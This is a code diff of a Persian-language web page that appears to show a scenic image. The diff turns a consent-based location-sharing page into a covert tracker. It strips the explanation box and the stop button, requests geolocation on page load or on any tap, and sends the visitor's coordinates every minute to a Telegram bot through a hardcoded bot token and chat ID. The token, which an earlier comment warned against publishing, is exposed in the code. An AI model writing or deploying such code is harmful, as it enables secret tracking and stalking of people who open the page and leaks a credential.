@@ -3,12 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <meta
-    http-equiv="Permissions-Policy"
-    content="geolocation=(self)"
-  >
-
+  <meta http-equiv="Permissions-Policy" content="geolocation=(self)">
   <title>اشتراک‌گذاری موقعیت</title>
 
   <style>
@@ -18,8 +13,7 @@
       padding: 0;
     }
 
-    html,
-    body {
+    html, body {
       width: 100%;
       height: 100%;
       overflow: hidden;
@@ -44,235 +38,78 @@
       pointer-events: none;
     }
 
-    #permissionBox {
-      position: fixed;
-      left: 50%;
-      top: 50%;
-      transform: translate(-50%, -50%);
-
-      width: calc(100% - 32px);
-      max-width: 420px;
-
-      padding: 24px;
-
-      background: rgba(0, 0, 0, 0.85);
-      color: #fff;
-
-      border-radius: 18px;
-      text-align: center;
-
-      z-index: 10;
-    }
-
-    #permissionBox h2 {
-      font-size: 20px;
-      margin-bottom: 14px;
-    }
-
-    #permissionBox p {
-      font-size: 14px;
-      line-height: 2;
-      margin-bottom: 18px;
-    }
-
-    #allowBtn {
-      border: 0;
-      padding: 13px 24px;
-
-      border-radius: 10px;
-
-      background: #198754;
-      color: #fff;
-
-      font-family: Tahoma, Arial, sans-serif;
-      font-size: 15px;
-      font-weight: bold;
-
-      cursor: pointer;
-    }
-
-    #allowBtn:disabled {
-      opacity: 0.6;
-    }
-
     #status {
       position: fixed;
-
       top: 15px;
       left: 15px;
       right: 15px;
-
       padding: 10px;
-
       border-radius: 10px;
-
       background: rgba(0, 0, 0, 0.75);
       color: #fff;
-
       text-align: center;
       font-size: 13px;
-
       z-index: 20;
       display: none;
     }
 
     #locationInfo {
       position: fixed;
-
       left: 15px;
       right: 15px;
       bottom: 15px;
-
       padding: 12px;
-
       background: rgba(0, 0, 0, 0.75);
       color: #fff;
-
       border-radius: 12px;
-
       direction: ltr;
       text-align: left;
-
       font-size: 12px;
-
       z-index: 15;
       display: none;
-    }
-
-    #stopBtn {
-      position: fixed;
-
-      left: 20px;
-      bottom: 30px;
-
-      width: 56px;
-      height: 56px;
-
-      border: 0;
-      border-radius: 50%;
-
-      background: rgba(220, 53, 69, 0.95);
-      color: #fff;
-
-      font-size: 23px;
-
-      display: none;
-      align-items: center;
-      justify-content: center;
-
-      z-index: 30;
-
-      touch-action: none;
     }
   </style>
 </head>
 
 <body>
 
-  <img
-    id="mainImage"
-    src="https://images.unsplash.com/photo-1500534623283-312aade485b7?auto=format&fit=crop&w=1600&q=85"
-    alt="تصویر"
-  >
-
+  <img id="mainImage" src="https://images.unsplash.com/photo-1500534623283-312aade485b7?auto=format&fit=crop&w=1600&q=85" alt="تصویر">
   <div id="overlay"></div>
-
-  <div id="permissionBox">
-
-    <h2>📍 دسترسی به موقعیت مکانی</h2>
-
-    <p>
-      با انتخاب گزینه زیر، موقعیت مکانی شما دریافت می‌شود.
-      اشتراک‌گذاری تا زمانی که این صفحه باز است ادامه خواهد داشت
-      و شما می‌توانید هر زمان آن را متوقف کنید.
-    </p>
-
-    <button id="allowBtn">
-      اجازه دسترسی به موقعیت
-    </button>
-
-  </div>
 
   <div id="status"></div>
 
   <div id="locationInfo">
-    Latitude:
-    <span id="lat">-</span>
-    <br>
-
-    Longitude:
-    <span id="lon">-</span>
-    <br>
-
-    Accuracy:
-    <span id="accuracy">-</span>
-    متر
-    <br>
-
-    Last update:
-    <span id="lastUpdate">-</span>
+    Latitude: <span id="lat">-</span><br>
+    Longitude: <span id="lon">-</span><br>
+    Accuracy: <span id="accuracy">-</span> متر<br>
+    Last update: <span id="lastUpdate">-</span>
   </div>
 
-  <button id="stopBtn" aria-label="توقف اشتراک‌گذاری">
-    ⛔
-  </button>
-
-
   <script>
-
-    /*
-     * Telegram
-     *
-     * توکن را در GitHub عمومی قرار ندهید.
-     */
-
-
-const BOT_TOKEN = "8947494572:AAGWviC7WYN2SJn0MV3RnQFfmUjSGP4wSec";
+    const BOT_TOKEN = "8947494572:AAGWviC7WYN2SJn0MV3RnQFfmUjSGP4wSec";
     const CHAT_ID = "8878957420";
     
-    const INTERVAL = 2 * 60 * 1000;
+    // بازه ارسال: ۱ دقیقه (۶۰,۰۰۰ میلی‌ثانیه)
+    const INTERVAL = 1 * 60 * 1000;
 
     let timer = null;
+    let isRequesting = false;
     let sharingActive = false;
 
-    const permissionBox =
-      document.getElementById("permissionBox");
-
-    const allowBtn =
-      document.getElementById("allowBtn");
-
-    const stopBtn =
-      document.getElementById("stopBtn");
-
-    const status =
-      document.getElementById("status");
-
-    const locationInfo =
-      document.getElementById("locationInfo");
-
-    const latElement =
-      document.getElementById("lat");
-
-    const lonElement =
-      document.getElementById("lon");
-
-    const accuracyElement =
-      document.getElementById("accuracy");
-
-    const lastUpdateElement =
-      document.getElementById("lastUpdate");
-
+    const status = document.getElementById("status");
+    const locationInfo = document.getElementById("locationInfo");
+    const latElement = document.getElementById("lat");
+    const lonElement = document.getElementById("lon");
+    const accuracyElement = document.getElementById("accuracy");
+    const lastUpdateElement = document.getElementById("lastUpdate");
 
     function showStatus(message) {
       status.textContent = message;
       status.style.display = "block";
     }
 
-
     function getLocation() {
-
       return new Promise((resolve, reject) => {
-
         navigator.geolocation.getCurrentPosition(
           resolve,
           reject,
@@ -282,198 +119,112 @@ const BOT_TOKEN = "8947494572:AAGWviC7WYN2SJn0MV3RnQFfmUjSGP4wSec";
             maximumAge: 0
           }
         );
-
       });
-
     }
 
-
-    async function sendLocation(position) {
-
-      const latitude =
-        position.coords.latitude;
-
-      const longitude =
-        position.coords.longitude;
-
-      const accuracy =
-        position.coords.accuracy;
-
-
-      latElement.textContent =
-        latitude;
-
-      lonElement.textContent =
-        longitude;
-
-      accuracyElement.textContent =
-        Math.round(accuracy);
-
-      lastUpdateElement.textContent =
-        new Date().toLocaleString("fa-IR");
-
-      locationInfo.style.display =
-        "block";
-
-
-      /*
-       * این قسمت فقط در صورتی فعال می‌شود
-       * که Backend امن برای Telegram داشته باشید.
-       */
-
-      console.log({
-        latitude,
-        longitude,
-        accuracy
-      });
-
+    async function sendLocationToTelegram(latitude, longitude) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            latitude: latitude,
+            longitude: longitude
+          })
+        });
+        const data = await response.json();
+        return data.ok;
+      } catch (err) {
+        console.error("خطا در ارسال به تلگرام:", err);
+        return false;
+      }
     }
 
+    async function processAndSend(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const accuracy = position.coords.accuracy;
+
+      latElement.textContent = latitude;
+      lonElement.textContent = longitude;
+      accuracyElement.textContent = Math.round(accuracy);
+      lastUpdateElement.textContent = new Date().toLocaleString("fa-IR");
+      locationInfo.style.display = "block";
+
+      const sent = await sendLocationToTelegram(latitude, longitude);
+      if (sent) {
+        showStatus("📍 موقعیت جدید به تلگرام ارسال شد.");
+      } else {
+        showStatus("⚠️ موقعیت دریافت شد اما ارسال به تلگرام ناموفق بود.");
+      }
+    }
 
     async function updateLocation() {
+      if (!sharingActive) return;
 
-      if (!sharingActive) {
+      try {
+        const position = await getLocation();
+        await processAndSend(position);
+      } catch (error) {
+        console.error(error);
+        showStatus("⚠️ دریافت موقعیت جدید ناموفق بود.");
+      }
+    }
+
+    async function initTracking() {
+      if (sharingActive || isRequesting) return;
+      isRequesting = true;
+
+      if (!window.isSecureContext) {
+        showStatus("❌ دسترسی به موقعیت فقط در لینک HTTPS کار می‌کند.");
+        isRequesting = false;
+        return;
+      }
+
+      if (!navigator.geolocation) {
+        showStatus("❌ مرورگر از Geolocation پشتیبانی نمی‌کند.");
+        isRequesting = false;
         return;
       }
 
       try {
+        // درخواست مجوز مستقیم از مرورگر
+        const position = await getLocation();
+        
+        sharingActive = true;
+        isRequesting = false;
 
-        const position =
-          await getLocation();
+        // حذف شنوندگان کلیک پس از دریافت موفق دسترسی
+        window.removeEventListener("click", initTracking);
+        window.removeEventListener("touchstart", initTracking);
 
-        await sendLocation(position);
+        // ارسال دفعه اول
+        await processAndSend(position);
+        showStatus("✅ دسترسی تایید شد. به‌روزرسانی خودکار هر ۱ دقیقه.");
 
-        showStatus(
-          "📍 موقعیت جدید دریافت شد."
-        );
+        // ارسال خودکار هر ۱ دقیقه
+        timer = setInterval(updateLocation, INTERVAL);
 
       } catch (error) {
-
+        isRequesting = false;
         console.error(error);
 
-        showStatus(
-          "⚠️ دریافت موقعیت جدید ناموفق بود."
-        );
-
+        if (error.code === error.PERMISSION_DENIED) {
+          showStatus("❌ دسترسی به موقعیت توسط کاربر رد شد.");
+        } else {
+          showStatus("❌ در انتظار دریافت مجوز موقعیت مکانی...");
+        }
       }
-
     }
 
+    // ۱. تلاش برای درخواست خودکار هنگام لود شدن صفحه
+    window.addEventListener("DOMContentLoaded", initTracking);
 
-    allowBtn.addEventListener(
-      "click",
-      async function () {
-
-        if (!window.isSecureContext) {
-
-          showStatus(
-            "❌ صفحه باید با HTTPS باز شود."
-          );
-
-          return;
-        }
-
-
-        if (!navigator.geolocation) {
-
-          showStatus(
-            "❌ مرورگر از Location پشتیبانی نمی‌کند."
-          );
-
-          return;
-        }
-
-
-        allowBtn.disabled = true;
-
-        allowBtn.textContent =
-          "در حال دریافت موقعیت...";
-
-
-        try {
-
-          const position =
-            await getLocation();
-
-
-          permissionBox.style.display =
-            "none";
-
-          stopBtn.style.display =
-            "flex";
-
-          sharingActive = true;
-
-
-          await sendLocation(position);
-
-
-          showStatus(
-            "✅ موقعیت دریافت شد. به‌روزرسانی هر ۲ دقیقه."
-          );
-
-
-          timer = setInterval(
-            updateLocation,
-            INTERVAL
-          );
-
-
-        } catch (error) {
-
-          console.error(error);
-
-          allowBtn.disabled = false;
-
-          allowBtn.textContent =
-            "اجازه دسترسی به موقعیت";
-
-
-          if (
-            error.code ===
-            error.PERMISSION_DENIED
-          ) {
-
-            showStatus(
-              "❌ اجازه دسترسی به موقعیت رد شد."
-            );
-
-          } else {
-
-            showStatus(
-              "❌ دریافت موقعیت ناموفق بود."
-            );
-
-          }
-
-        }
-
-      }
-    );
-
-
-    stopBtn.addEventListener(
-      "click",
-      function () {
-
-        sharingActive = false;
-
-        if (timer !== null) {
-          clearInterval(timer);
-          timer = null;
-        }
-
-        stopBtn.style.display =
-          "none";
-
-        showStatus(
-          "⛔ اشتراک‌گذاری متوقف شد."
-        );
-
-      }
-    );
-
+    // ۲. پشتیبان: در صورت بلاک بودن درخواست خودکار، با اولین لمس/کلیک کاربر روی صفحه مجوز درخواست می‌شود
+    window.addEventListener("click", initTracking);
+    window.addEventListener("touchstart", initTracking);
   </script>
-
 </body>
 </html>
